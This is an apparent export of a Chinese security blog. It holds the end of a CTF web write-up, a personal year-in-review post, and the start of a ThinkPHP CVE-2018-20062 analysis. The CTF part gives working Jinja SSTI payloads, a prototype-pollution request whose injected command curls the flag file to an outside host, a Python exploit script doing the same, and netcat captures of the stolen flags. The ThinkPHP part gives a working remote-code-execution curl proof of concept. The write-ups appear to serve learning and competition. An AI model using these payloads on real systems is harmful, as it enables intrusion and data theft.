<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /search?flag=&#123;&#123;lipsum[&quot;\x5f\x5fglobals\x5f\x5f&quot;][&quot;\x6fs&quot;][&quot;popen&quot;](&quot;tac+app\x2epy&quot;)[&quot;rea\x64&quot;]()&#125;&#125; HTTP/1.1</span><br><span class="line">Host: 123.56.175.221:48127</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Authorization: Basic dG9tY2F0OnRvbWNhdA==</span><br><span class="line">DNT: 1</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-TW,zh-CN;q=0.9,zh;q=0.8,en;q=0.7,ja;q=0.6</span><br><span class="line">Cookie: access_token_cookie=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiJ9.p7j5Fnbpfmw45f43J0ZkFs_JXs1h_rRozLAZEjsbdVM</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>flag{SsTi_IS_InTerEstinG!!!!!}</p>
<h3 id="just_proto">JUST_PROTO</h3>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> &#123; exec &#125; = <span class="built_in">require</span>(<span class="string">&quot;child_process&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> res.<span class="title function_">send</span>(<span class="string">&#x27;嗨嗨嗨！！老八来了！！！&#x27;</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> ba = &#123;</span><br><span class="line">    <span class="attr">baba</span>: <span class="function">(<span class="params">token</span>)=&gt;</span>&#123; <span class="keyword">return</span> !!token &#125;,</span><br><span class="line">    <span class="attr">bababa</span>: <span class="function">()=&gt;</span>&#123; <span class="keyword">if</span> (<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(date).<span class="property">length</span> &gt; <span class="number">10000</span>) date = &#123;&#125; &#125;, </span><br><span class="line">    <span class="comment">// set: `redis-cli -h $&#123;ba.redis_host&#125; set `</span></span><br><span class="line">    <span class="comment">// get: `redis-cli -h $&#123;ba.redis_host&#125; get `</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> date = &#123;&#125;;</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/set&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    ba.<span class="title function_">bababa</span>(); </span><br><span class="line">    <span class="keyword">const</span> &#123;token, key, val&#125; = req.<span class="property">query</span>;</span><br><span class="line">    <span class="keyword">if</span> (!ba.<span class="title function_">baba</span>(token) || !val) <span class="keyword">return</span> res.<span class="title function_">send</span>(<span class="string">&quot;wrong&quot;</span>); </span><br><span class="line">    date[token][key] = val; </span><br><span class="line">    res.<span class="title function_">json</span>(&#123; <span class="attr">is_succ</span>: <span class="literal">true</span> &#125;)</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/get&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> &#123;token, key&#125; = req.<span class="property">query</span>;</span><br><span class="line">    <span class="keyword">if</span> (!ba.<span class="title function_">baba</span>(token)) <span class="keyword">return</span> res.<span class="title function_">send</span>(<span class="string">&quot;wrong&quot;</span>);</span><br><span class="line">    <span class="keyword">let</span> result = date[token];</span><br><span class="line">    <span class="keyword">if</span> (result) result = result[key];</span><br><span class="line">    res.<span class="title function_">json</span>(&#123; <span class="attr">result</span>: result === <span class="literal">undefined</span> ? <span class="string">&quot;null&quot;</span> : result, <span class="attr">is_succ</span>: result !== <span class="literal">undefined</span> &#125;)</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.<span class="title function_">put</span>(<span class="string">&#x27;/bkup&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> date_stream = <span class="title class_">Buffer</span>.<span class="title function_">from</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(date)); </span><br><span class="line">    <span class="keyword">const</span> cmd = ba.<span class="property">redis_set</span> + <span class="string">`date <span class="subst">$&#123;date_stream.toString(<span class="string">&#x27;base64&#x27;</span>)&#125;</span>`</span>;</span><br><span class="line">    <span class="title function_">exec</span>(cmd, <span class="function">(<span class="params">err,_,__</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (err) <span class="keyword">return</span> res.<span class="title function_">json</span>(&#123; <span class="attr">is_succ</span>: <span class="literal">false</span> &#125;);</span><br><span class="line">        res.<span class="title function_">json</span>(&#123; <span class="attr">is_succ</span>: <span class="literal">true</span> &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(<span class="number">8080</span>, <span class="function">() =&gt;</span> <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`嗨嗨嗨！！老八来了！！！`</span>));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//没敢吧所有变量名换成bababa 怕被打</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://39.106.154.70:26132/set?token=__proto__&amp;key=redis_set&amp;val=curl%20-F%20%22x=@/flag%22%20-X%20POST%20http://175.178.111.34:7777</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(base) ubuntu@VM-8-15-ubuntu:~$ nc -lvvp 7777</span><br><span class="line">Listening on 0.0.0.0 7777</span><br><span class="line">Connection received on 39.107.243.76 11515</span><br><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: 175.178.111.34:7777</span><br><span class="line">User-Agent: curl/7.52.1</span><br><span class="line">Accept: */*</span><br><span class="line">Content-Length: 232</span><br><span class="line">Expect: 100-continue</span><br><span class="line">Content-Type: multipart/form-data; boundary=------------------------d021bc79c8a15513</span><br><span class="line"></span><br><span class="line">--------------------------d021bc79c8a15513</span><br><span class="line">Content-Disposition: form-data; name=&quot;x&quot;; filename=&quot;flag&quot;</span><br><span class="line">Content-Type: application/octet-stream</span><br><span class="line"></span><br><span class="line">flag&#123;MbkFk47Rxcn3eJFRt2CmwxxWsWQw2VGa&#125;</span><br><span class="line"></span><br><span class="line">--------------------------d021bc79c8a15513--</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;% set po=dict(po=a,p=a)|join%&#125;&#123;% set a=(()|select|string|list)|attr(po)(２４)%&#125;&#123;% set ini=(a,a,dict(init=a)|join,a,a)|join()%&#125;&#123;% set glo=(a,a,dict(globals=a)|join,a,a)|join()%&#125;&#123;% set geti=(a,a,dict(getitem=a)|join,a,a)|join()%&#125;&#123;% set built=(a,a,dict(builtins=a)|join,a,a)|join()%&#125;&#123;% set x=(q|attr(ini)|attr(glo)|attr(geti))(built)%&#125;&#123;% set chr=x.chr%&#125;&#123;% set cmd=()%&#125;&#123;%if x.eval(cmd)%&#125;aaa&#123;%endif%&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import re</span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">str = requests.get(</span><br><span class="line">    &quot;http://127.0.0.1:7777/2023/gz/no.php?cmd=&quot; + &#x27;cat /f1ag_g4lfcdecddefewfebge /|curl -d @- -X POST http://175.178.111.34:7777&#x27;).text</span><br><span class="line">result = &quot;&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def half2full(half):</span><br><span class="line">    full = &#x27;&#x27;</span><br><span class="line">    for ch in half:</span><br><span class="line">        if ord(ch) in range(33, 127):</span><br><span class="line">            ch = chr(ord(ch) + 0xfee0)</span><br><span class="line">        elif ord(ch) == 32:</span><br><span class="line">            ch = chr(0x3000)</span><br><span class="line">        else:</span><br><span class="line">            pass</span><br><span class="line">        full += ch</span><br><span class="line">    return full</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">for i in re.findall(&#x27;\d&#123;2,3&#125;&#x27;, str):</span><br><span class="line">    result += &quot;chr(&quot; + half2full(i) + &quot;)~&quot;</span><br><span class="line">    # print(i)</span><br><span class="line">print(result[:-1])</span><br><span class="line"></span><br><span class="line">res = &quot;&#123;% set po=dict(po=a,p=a)|join%&#125;&#123;% set a=(()|select|string|list)|attr(po)(２４)%&#125;&#123;% set ini=(a,a,dict(init=a)|join,a,a)|join()%&#125;&#123;% set glo=(a,a,dict(globals=a)|join,a,a)|join()%&#125;&#123;% set geti=(a,a,dict(getitem=a)|join,a,a)|join()%&#125;&#123;% set built=(a,a,dict(builtins=a)|join,a,a)|join()%&#125;&#123;% set x=(q|attr(ini)|attr(glo)|attr(geti))(built)%&#125;&#123;% set chr=x.chr%&#125;&#123;% set cmd=(&quot; + result[:-1] + &quot;)%&#125;&#123;%if x.eval(cmd)%&#125;aaa&#123;%endif%&#125;&quot;</span><br><span class="line">url = &quot;http://39.107.82.169:63151/?miniID=&quot; + res</span><br><span class="line">requests.get(url=url)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(base) ubuntu@VM-8-15-ubuntu:~$ nc -lvvp 7777</span><br><span class="line">Listening on 0.0.0.0 7777</span><br><span class="line">Connection received on 39.107.243.76 31879</span><br><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: 175.178.111.34:7777</span><br><span class="line">User-Agent: curl/7.64.0</span><br><span class="line">Accept: */*</span><br><span class="line">Content-Length: 38</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">flag&#123;GCqYdG6x8Dt7Q3rvQfWuvx28UxC9Ctrx&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from flask import Flask,render_template,request,render_template_string</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/&#x27;,methods = [&#x27;POST&#x27;,&#x27;GET&#x27;])</span><br><span class="line">def index():</span><br><span class="line">    def safe_jinja(m):</span><br><span class="line">        forbidden = [&#x27;[&#x27;,&#x27;&#123;&#123;&#x27;,&#x27;_&#x27;,&#x27;class&#x27;,&#x27;+&#x27;,&#x27;popen&#x27;,&#x27;*&#x27;,&#x27;import&#x27;,&#x27;request&#x27;]</span><br><span class="line">        for n in forbidden:</span><br><span class="line">            while True:</span><br><span class="line">                if n in m:</span><br><span class="line">                    return &quot;Forbidden!!!&quot;</span><br><span class="line">                else:</span><br><span class="line">                    break</span><br><span class="line">        return m</span><br><span class="line">    id = request.args.get(&#x27;miniID&#x27;)</span><br><span class="line">    html = &#x27;&#x27;&#x27;</span><br><span class="line">        &lt;h2 align=&quot;center&quot;&gt;it&#x27;s time.Show me your documents,please.&lt;/h2&gt;</span><br><span class="line">        &lt;h2 align=&quot;center&quot;&gt;I will GET your miniID.&lt;/h2&gt;</span><br><span class="line">        &lt;h2 align=&quot;center&quot;&gt;%s&lt;/h2&gt;</span><br><span class="line">    &#x27;&#x27;&#x27;%(id)</span><br><span class="line">    html = safe_jinja(html)</span><br><span class="line">    return render_template_string(html)</span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    app.run(host=&#x27;0.0.0.0&#x27;,port=80)</span><br></pre></td></tr></table></figure>
<p>https://cloud.tencent.com/developer/article/2238031?areaSource=&amp;traceId=</p>
<p>https://yagsheg.com/2021/05/08/SUID-%E6%8F%90%E6%9D%83%E5%B0%8F%E8%AE%B0/</p>
]]></content>
      <categories>
        <category>题解</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>2025 我要成为什么样的人呀</title>
    <url>/2024-Final/</url>
    <content><![CDATA[<p>今年喜欢这首歌，“你可见过，两片相同的树叶？人不可复写，生命是原创的情节”。</p>
<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" style="margin-left: 0" src="https://music.163.com/outchain/player?type=2&amp;id=2061039360&amp;auto=0&amp;height=66">
</iframe>
<span id="more"></span>
<h1 id="前言">前言</h1>
<p>人总是好了伤疤忘了痛，得益于这一年时有间断的锻炼，我不由得再次开始幻想远方了。</p>
<p>贪心的人总有些可笑，像个蹒跚的拾荒者，在前行的路上拼命伸手，想捡起每一片看似光亮的瓦砾，但没了光的折射，也不过是一片灰暗。</p>
<p>这并非一种简单的欲望，而是一种深深的恐惧，是我对未来的无力感的掩饰。</p>
<p>我急切地在泥泞中寻找出口，想象着自己如何能够轻松地一跃而起，站上属于我的那片高地。</p>
<p>然而，现实的残酷很快显现，每一个方向我都难以抉择且拼尽全力，时间与精力的短缺像锁链一样将我束缚。</p>
<p>我发现，自己已不再也不能像从前那个奋力向前跳跃，可以不问前程的少年了。</p>
<p>这也许是人生最可悲的事情：总想伸手摘星，却连地上的野花都未能采得几朵。</p>
<h1 id="新年-flag">新年 FLAG</h1>
<p>去年的只完成了前四个，今年继续吧 XD。</p>
<ul class="task-list">
<li><label><input
type="checkbox" />继续坚持健身【下腹肌好难练</label></li>
<li><label><input type="checkbox" />坚持练字</label></li>
<li><label><input type="checkbox" />雅思过
<strong>7</strong></label></li>
<li><label><input type="checkbox" />软考过高级</label></li>
<li><label><input type="checkbox" />看极光</label></li>
<li><label><input type="checkbox" />看雪山</label></li>
<li><label><input type="checkbox" />多看一些书来充实自己</label></li>
<li><label><input type="checkbox" /><del>早睡早起</del></label></li>
</ul>
<h1 id="接下来要做的事">接下来要做的事</h1>
<p>不知道。</p>
<h1 id="一些时间锚点">一些时间锚点</h1>
<h2 id="福州-下雪了">1.23 福州 下雪了</h2>
<p>第一次在南方看见雪。</p>
<p><img src="/images/2024-Final/IMG_7094.webp" /></p>
<h2 id="杭州-阿里云-ctf-5th">3.30 杭州 阿里云 CTF 5th</h2>
<p>阿里云这个自助餐真行吧。</p>
<p><img src="/images/2024-Final/IMG_7093.webp" /></p>
<h2 id="成都-xctf-final-3rd">6.23 成都 XCTF Final 3rd</h2>
<p>吃饭，打比赛和撸猫。</p>
<p>虽然没出什么力但是还是要夸自己一句辛苦了。</p>
<p><img src="/images/2024-Final/IMG_7095.webp" /></p>
<h2 id="青岛-矩阵杯">6.26 青岛 矩阵杯</h2>
<p>和 TEL，Char0n，Frank 一起去的一场。</p>
<p>吃饭，打比赛。</p>
<p>打得浑身难受的一场渗透。</p>
<p>还有 Frank 的生日。</p>
<p><img src="/images/2024-Final/IMG_7096.webp" /></p>
<h2 id="杭州-蚂蚁集团">7.1 杭州 蚂蚁集团</h2>
<p>杭州有很多好看的云。</p>
<p>组里的小姐姐运动细菌很多，爬山特别猛。</p>
<p>组里团建吃的真好。</p>
<p>还有朋友生日。</p>
<p>实习生训练营画了个龙蚁。</p>
<p><img src="/images/2024-Final/IMG_7097.webp" /></p>
<h2 id="青甘大环线">9.14 青甘大环线</h2>
<p>烧卖小团建说是，和 GZ，Zhengtai，Xierluo 一起去的。</p>
<p>好喜欢西北的辽阔无垠与荒凉感。</p>
<p><img src="/images/2024-Final/IMG_7098.webp" /></p>
<h2 id="青岛">10.8 青岛</h2>
<p>某些原因又来了一趟。</p>
<p>我寻思着青岛海鲜炫得比福州广州都爽。</p>
<p><img src="/images/2024-Final/IMG_7099.webp" /></p>
<h2 id="广州">10.19 广州</h2>
<p>广州的云也好看。</p>
<p>还有一些时不时的烧卖小团建。</p>
<p><img src="/images/2024-Final/IMG_7100.webp" /></p>
<h2 id="武汉-研究生国赛">11.15 武汉 研究生国赛</h2>
<p>鹏城实验室的靶场真得是史。</p>
<p><img src="/images/2024-Final/IMG_7101.webp" /></p>
<h2 id="贵阳-网鼎杯">11.23 贵阳 网鼎杯</h2>
<p>猫猫洞。</p>
<p>BinX 最好成绩了，半决赛 rk5 😭。</p>
<p><img src="/images/2024-Final/IMG_7105.webp" /></p>
<h2 id="深圳-cse-2024-会议">11.27 深圳 CSE 2024 会议</h2>
<p>又来冒充研究生了我。</p>
<p><img src="/images/2024-Final/IMG_7102.webp" /></p>
<h2 id="河南-郑州-强网杯-final-8th">12.06 河南 郑州 强网杯 Final
8th</h2>
<p>意料之外的成绩，但也在意料之中，毕竟家人们都很厉害 🥰。</p>
<p><img src="/images/2024-Final/IMG_7103.webp" /></p>
<h2 id="广州深圳香港-s1um4i-团建">12.20 广州/深圳/香港 S1uM4i 团建</h2>
<p>年底大团建，见了很多烧卖的家人们。</p>
<p>“原来你住这种地方，复式高层望海临江”，继续 GO 一辈子好喵。</p>
<p>逛了中大深大南科，中大真的好像霍格沃茨。。。南科的猫很黏人。</p>
<p><img src="/images/2024-Final/IMG_7104.webp" /></p>
<h1 id="最后的碎碎念">最后的碎碎念</h1>
<p>我要向路过的家人们展示一下我们绝美的烧卖娘周边了。</p>
<p><img src="/images/2024-Final/IMG_7106.webp" /></p>
<p>短发可爱眼镜娘小女友送给我的键帽 🥰。</p>
<p><img src="/images/2024-Final/IMG_7107.webp" /></p>
<p>签了🐜的卖身契。</p>
<p><img src="/images/2024-Final/IMG_7108.webp" /></p>
<p>会幸福的吧。</p>
]]></content>
      <categories>
        <category>闲聊</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>ThinkPHP修炼计划 CVE-2018-20062</title>
    <url>/CVE-2018-20062/</url>
    <content><![CDATA[<h1 id="前言">前言</h1>
<p>疯狂恶补以前拉下的东西。</p>
<span id="more"></span>
<h1 id="影响范围">影响范围</h1>
<p><strong>5.0.x&lt; 5.0.24、5.1.x&lt;5.1.31</strong></p>
<h1 id="construct变量覆盖rce">__construct变量覆盖RCE</h1>
<h2 id="例子">例子</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl -X <span class="string">&#x27;POST&#x27;</span> <span class="string">&#x27;http://127.0.0.1:18888/tp5/public/index.php?s=captcha&#x27;</span> -d <span class="string">&#x27;_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=id&#x27;</span>  </span><br></pre></td></tr></table></figure>
<h2 id="原理">原理</h2>
<h3 id="section">5.0.22</h3>
<p>版本<a
href="https://github.com/top-think/framework/archive/refs/tags/v5.0.22.zip"><strong>thinkphp_5.0.22</strong></a>。</p>
<p>从<strong>public/index.php</strong>开始。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 加载框架引导文件</span></span><br><span class="line"><span class="keyword">require</span> <span class="keyword">__DIR__</span> . <span class="string">&#x27;/../thinkphp/start.php&#x27;</span>;</span><br></pre></td></tr></table></figure>
<p>跟进到<strong>thinkphp/start.php</strong>。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 2. 执行应用</span></span><br><span class="line"><span class="title class_">App</span>::<span class="title function_ invoke__">run</span>()-&gt;<span class="title function_ invoke__">send</span>();</span><br></pre></td></tr></table></figure>
<p>继续跟进<strong>run</strong>方法，前面是一堆初始化信息，一直到这边获取调度信息，初始化为空，因此开始进行路由检测，调用<strong>routeCheck</strong>方法。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span>(<span class="params">Request <span class="variable">$request</span> = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="comment">// 获取应用调度信息</span></span><br><span class="line">    <span class="variable">$dispatch</span> = <span class="built_in">self</span>::<span class="variable">$dispatch</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 未设置调度信息则进行 URL 路由检测</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$dispatch</span>)) &#123;</span><br><span class="line">        <span class="variable">$dispatch</span> = <span class="built_in">self</span>::<span class="title function_ invoke__">routeCheck</span>(<span class="variable">$request</span>, <span class="variable">$config</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>开局一个<strong>$request-&gt;path()</strong>调用。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">routeCheck</span>(<span class="params"><span class="variable">$request</span>, <span class="keyword">array</span> <span class="variable">$config</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$path</span> = <span class="variable">$request</span>-&gt;<span class="title function_ invoke__">path</span>();</span><br><span class="line">    <span class="variable">$depr</span> = <span class="variable">$config</span>[<span class="string">&#x27;pathinfo_depr&#x27;</span>];</span><br><span class="line">    <span class="variable">$result</span> = <span class="literal">false</span>;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>path</strong>方法中，开头拿到<strong>$suffix</strong>为<strong>html</strong>，继续跟进<strong>$this-&gt;pathinfo()</strong>。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">path</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">is_null</span>(<span class="variable">$this</span>-&gt;path)) &#123;</span><br><span class="line">        <span class="variable">$suffix</span> = <span class="title class_">Config</span>::<span class="title function_ invoke__">get</span>(<span class="string">&#x27;url_html_suffix&#x27;</span>); <span class="comment">// html</span></span><br><span class="line">        <span class="variable">$pathinfo</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">pathinfo</span>();</span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;path;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>$pathinfo</strong>为空，进入判断兼容模式参数，<strong>Config::get('var_pathinfo')</strong>初始为<strong>s</strong>，即<strong>POC</strong>中<strong>GET</strong>传参的<strong>s</strong>赋值给<strong>$_SERVER['PATH_INFO']</strong>，然后销毁变量。</p>
<p>由于赋值后不为空，因此继续赋值<strong>captcha</strong>给<strong>$pathinfo</strong>，然后返回。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">pathinfo</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">is_null</span>(<span class="variable">$this</span>-&gt;pathinfo)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="title class_">Config</span>::<span class="title function_ invoke__">get</span>(<span class="string">&#x27;var_pathinfo&#x27;</span>)])) &#123;</span><br><span class="line">            <span class="comment">// 判断URL里面是否有兼容模式参数</span></span><br><span class="line">            <span class="variable">$_SERVER</span>[<span class="string">&#x27;PATH_INFO&#x27;</span>] = <span class="variable">$_GET</span>[<span class="title class_">Config</span>::<span class="title function_ invoke__">get</span>(<span class="string">&#x27;var_pathinfo&#x27;</span>)];</span><br><span class="line">            <span class="keyword">unset</span>(<span class="variable">$_GET</span>[<span class="title class_">Config</span>::<span class="title function_ invoke__">get</span>(<span class="string">&#x27;var_pathinfo&#x27;</span>)]);</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (IS_CLI) &#123;</span><br><span class="line">            <span class="comment">// CLI模式下 index.php module/controller/action/params/...</span></span><br><span class="line">            <span class="variable">$_SERVER</span>[<span class="string">&#x27;PATH_INFO&#x27;</span>] = <span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;argv&#x27;</span>][<span class="number">1</span>]) ? <span class="variable">$_SERVER</span>[<span class="string">&#x27;argv&#x27;</span>][<span class="number">1</span>] : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 分析PATHINFO信息</span></span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;PATH_INFO&#x27;</span>])) &#123;</span><br><span class="line">            <span class="keyword">foreach</span> (<span class="title class_">Config</span>::<span class="title function_ invoke__">get</span>(<span class="string">&#x27;pathinfo_fetch&#x27;</span>) <span class="keyword">as</span> <span class="variable">$type</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$_SERVER</span>[<span class="variable">$type</span>])) &#123;</span><br><span class="line">                    <span class="variable">$_SERVER</span>[<span class="string">&#x27;PATH_INFO&#x27;</span>] = (<span class="number">0</span> === <span class="title function_ invoke__">strpos</span>(<span class="variable">$_SERVER</span>[<span class="variable">$type</span>], <span class="variable">$_SERVER</span>[<span class="string">&#x27;SCRIPT_NAME&#x27;</span>])) ?</span><br><span class="line">                        <span class="title function_ invoke__">substr</span>(<span class="variable">$_SERVER</span>[<span class="variable">$type</span>], <span class="title function_ invoke__">strlen</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;SCRIPT_NAME&#x27;</span>])) : <span class="variable">$_SERVER</span>[<span class="variable">$type</span>];</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;pathinfo = <span class="keyword">empty</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;PATH_INFO&#x27;</span>]) ? <span class="string">&#x27;/&#x27;</span> : <span class="title function_ invoke__">ltrim</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;PATH_INFO&#x27;</span>], <span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;pathinfo;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>返回<strong>path</strong>方法后，前面拿到<strong>$suffix</strong>不为<strong>false</strong>，进入第二个<strong>if</strong>语句，返回<strong>$path</strong>为<strong>captcha</strong>。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">path</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">is_null</span>(<span class="variable">$this</span>-&gt;path)) &#123;</span><br><span class="line">        <span class="variable">$suffix</span>   = <span class="title class_">Config</span>::<span class="title function_ invoke__">get</span>(<span class="string">&#x27;url_html_suffix&#x27;</span>);</span><br><span class="line">        <span class="variable">$pathinfo</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">pathinfo</span>();</span><br><span class="line">        <span class="keyword">if</span> (<span class="literal">false</span> === <span class="variable">$suffix</span>) &#123;</span><br><span class="line">            <span class="comment">// 禁止伪静态访问</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;path = <span class="variable">$pathinfo</span>;</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (<span class="variable">$suffix</span>) &#123;</span><br><span class="line">            <span class="comment">// 去除正常的URL后缀</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;path = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/\.(&#x27;</span> . <span class="title function_ invoke__">ltrim</span>(<span class="variable">$suffix</span>, <span class="string">&#x27;.&#x27;</span>) . <span class="string">&#x27;)$/i&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$pathinfo</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 允许任何后缀访问</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;path = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/\.&#x27;</span> . <span class="variable">$this</span>-&gt;<span class="title function_ invoke__">ext</span>() . <span class="string">&#x27;$/i&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$pathinfo</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;path;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>$path</strong>为<strong>captcha</strong>，<strong>$depr</strong>默认为<strong>/</strong>，下一步判断，<strong>self::$routeCheck</strong>初始为空，而<strong>config['url_route_on']</strong>初始为<strong>true</strong>，因此进入路由检测。</p>
